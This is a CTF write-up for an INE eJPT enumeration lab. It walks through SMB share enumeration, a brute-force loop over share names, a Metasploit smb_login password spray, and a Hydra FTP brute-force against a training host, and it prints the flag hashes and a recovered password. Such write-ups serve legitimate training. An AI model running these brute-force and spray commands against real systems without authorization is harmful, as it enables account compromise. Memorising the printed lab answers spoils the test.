# INE eJPT — Assessment Methodologies: Enumeration CTF 1

**Course:** INE / eJPT — Assessment Methodologies  
**Lab:** Enumeration CTF 1  
**Author:** Zeliha Zengin

---

## Lab Environment

A Linux machine is accessible at `target.ine.local`. Identify the services and capture the flags (MD5 format).

- **Flag 1:** A Samba share allows anonymous access — see what's in it.
- **Flag 2:** One Samba user has a bad password; their private share (named after them) is at risk.
- **Flag 3:** Follow the hint from the previous flag.
- **Flag 4:** A warning meant to deter unauthorized logins.

Useful wordlists live in `/root/Desktop/wordlists` (`shares.txt`, `unix_passwords.txt`).

**Tools used:** Nmap · Metasploit · Hydra · enum4linux · smbclient · smbmap

> **Note:** Flag format is `FLAG1{MD5Hash}` — submit only the hash.

> *All work is performed against an authorized INE training lab for eJPT exam preparation.*

## Flag 1 — Anonymous Samba share

```bash
nmap -sV -Pn -A -p- -sC target.ine.local
cat /etc/hosts
```

Enumerate shares, then brute the share name with a custom wordlist. Quick path with smbmap/smbclient:

```bash
smbmap -H <target-ip> -u anonymous
smbmap -H <target-ip> -u anonymous -r pubfiles
smbclient //<target-ip>/pubfiles -N
```

A small Bash loop also finds accessible shares from `shares.txt`:

```bash
while read -r share; do
  smbclient "//$target/$share" -N -c "ls" &>/dev/null \
    && echo "[+] accessible: $share"
done < /root/Desktop/wordlists/shares.txt
```

The `pubfiles` share allows anonymous access — download and read `flag1.txt`:

```bash
smbclient \\\\target.ine.local\\pubfiles
smb> get flag1.txt
# new terminal:
cat flag1.txt
```

> 🏁 **FLAG 1:** `7289bd68182d44379426e01f1149ae5c`

## Flag 2 — Weak Samba user password

Enumerate users with enum4linux:

```bash
enum4linux -a target.ine.local
# josh, bob, nancy, alice
```

Save the usernames and spray them against a wordlist with Metasploit's `smb_login`:

```bash
msfconsole
use auxiliary/scanner/smb/smb_login
set RHOSTS target.ine.local
set USER_FILE smbusers.txt
set PASS_FILE /root/Desktop/wordlists/unix_passwords.txt
set VERBOSE false
run
```

A valid pair is found. Connect to the user's private share and read the flag:

```bash
smbclient //target.ine.local/josh -U josh
# password: purple
cat flag2.txt
```

> 🏁 **FLAG 2:** `659372d1f4f442ddbecbbfb746af658a`

## Flag 3 — Hint → FTP brute-force

The flag 2 hint points to FTP. Nmap shows FTP on a non-default port (5554), so set it with `-s`:

```bash
hydra -L smbusers.txt -P /root/Desktop/wordlists/unix_passwords.txt ftp://target.ine.local -s 5554
```

Log in with the discovered credentials and read `flag3.txt`.

> 🏁 **FLAG 3:** `8e1cf3a6ec0545dba7d3b9d102cd99df`

## Flag 4 — SSH login banner

Nmap shows SSH is open. The flag is the warning banner shown when connecting:

```bash
ssh target.ine.local
```

> **Note:** The flag is displayed in the SSH pre-auth banner (the warning meant to deter unauthorized logins).

## Summary

| Flag | Technique |
| --- | --- |
| 1 | Anonymous SMB share enumeration (smbmap/smbclient + custom wordlist) |
| 2 | User enum (enum4linux) + smb_login password spray |
| 3 | FTP brute-force with Hydra on a non-default port |
| 4 | Reading the SSH login banner |

### Key Takeaways

- `enum4linux` is the go-to for pulling SMB users, shares, and policies.
- Metasploit's `smb_login` sprays username/password lists efficiently.
- Always read Nmap output for non-standard ports — Hydra needs `-s <port>`.
- Banners (SSH, FTP) can themselves hold information.

---

*Write-up by Zeliha Zengin · eJPT preparation*